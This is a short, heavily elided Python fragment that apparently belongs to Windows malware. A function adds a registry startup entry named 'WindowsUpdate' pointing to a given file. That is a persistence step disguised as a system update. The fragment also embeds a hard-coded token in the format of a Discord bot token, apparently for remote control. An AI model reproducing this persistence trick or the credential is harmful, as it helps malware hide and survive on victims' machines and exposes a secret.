...
def add_to_startup(file_path=""):
    ...
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)
...
token = 'MTA2NjY5MjA5MzU5MTk2NTc2OA.GqqRXw.wLIniD9vNz4ekSZq3KfRTdJghnZg-TmgBF47vc'
global appdata
